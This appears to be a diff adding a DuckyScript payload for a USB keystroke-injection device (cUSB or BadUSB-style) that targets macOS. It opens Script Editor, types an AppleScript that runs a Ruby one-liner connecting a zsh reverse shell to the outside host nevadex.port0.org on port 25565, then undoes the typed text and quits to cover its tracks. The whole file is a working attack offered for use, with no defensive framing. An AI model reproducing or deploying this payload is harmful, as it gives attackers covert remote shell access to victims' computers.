@@ -1,0 +1,23 @@
+# duckyscript that spawns a reverse shell using the apple script editor
+# very fast, must be run using the cUSB HID emulator
+# use with something like dbisu/badusb by increasing delays
+# SINGLE_KEY_MODE is unique to cUSB
+
+SINGLE_KEY_MODE
+gui space
+DELAY 50
+STRING scri
+enter
+DELAY 200
+STRING do shell script "/bin/bash -s <<'EOF'
+enter
+STRING ruby -rsocket -e'spawn(\"zsh\",[:in,:out,:err]=>TCPSocket.new(\"nevadex.port0.org\",25565))'
+enter
+STRING EOF"
+gui r
+DELAY 250
+gui z
+gui z
+gui z
+gui z
+gui q
